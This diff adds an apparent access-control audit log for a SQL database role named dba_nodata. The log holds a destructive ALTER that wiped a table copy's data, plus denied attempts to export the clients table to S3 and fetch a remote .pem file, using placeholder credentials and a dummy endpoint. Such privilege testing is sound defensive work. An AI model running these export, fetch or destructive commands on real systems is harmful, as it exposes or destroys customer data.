@@ -1,0 +1,21 @@
+### [t_dnd] ALTER TABLE biz.clients_copy MODIFY COLUMN fio INT
+
+### [t_dnd] SHOW ALTER TABLE COLUMN FROM biz WHERE TableName='clients_copy'
+JobId	TableName	CreateTime	FinishTime	IndexName	IndexId	OriginIndexId	SchemaVersion	TransactionId	State	Msg	Progress	Timeout
+12044	clients_copy	2026-10-29 15:49:37	2026-10-29 15:49:51	clients_copy	12045	12040	1:1146938668	2016	FINISHED		NULL	86400
+
+### [root] SELECT * FROM biz.clients_copy
+
+### [t_dnd] EXPORT TABLE biz.clients TO 's3://dnd-bucket/export/' PROPERTIES('column_separator'=',') WITH BROKER ('aws.s3.access_key'='x','aws.s3.secret_key'='y','aws.s3.endpoint'='http://127.0.0.1:1','aws.s3.region'='us-east-1')
+ERROR 5203 (42000) at line 1: Access denied; you need (at least one of) the EXPORT privilege(s) on TABLE clients for this operation. Please ask the admin to grant permission(s) or try activating existing roles using <set [default] role>. Current role(s): [dba_nodata]. Inactivated role(s): NONE.
+
+### [t_dnd] CREATE REPOSITORY dnd_repo WITH BROKER ON LOCATION 's3://dnd-bucket/repo' PROPERTIES('aws.s3.access_key'='x','aws.s3.secret_key'='y','aws.s3.endpoint'='http://127.0.0.1:1','aws.s3.region'='us-east-1')
+ERROR 5203 (42000) at line 1: Access denied; you need (at least one of) the REPOSITORY privilege(s) on SYSTEM for this operation. Please ask the admin to grant permission(s) or try activating existing roles using <set [default] role>. Current role(s): [dba_nodata]. Inactivated role(s): NONE.
+
+### [t_dnd] CREATE FILE 'dnd.pem' IN biz PROPERTIES('url'='http://127.0.0.1:1/x','catalog'='internal')
+ERROR 5203 (42000) at line 1: Access denied; you need (at least one of) the FILE privilege(s) on SYSTEM for this operation. Please ask the admin to grant permission(s) or try activating existing roles using <set [default] role>. Current role(s): [dba_nodata]. Inactivated role(s): NONE.
+
+
+### [root] состояние biz.clients_copy после ALTER MODIFY COLUMN fio INT, выполненного ролью dba_nodata:
+# DESC: fio стал int; SELECT вернул 0 строк — несовместимое приведение VARCHAR->INT уничтожило данные.
+# Вывод: роль с ALTER/DROP влияет на целостность/доступность (by design), но прочитать значения не может.
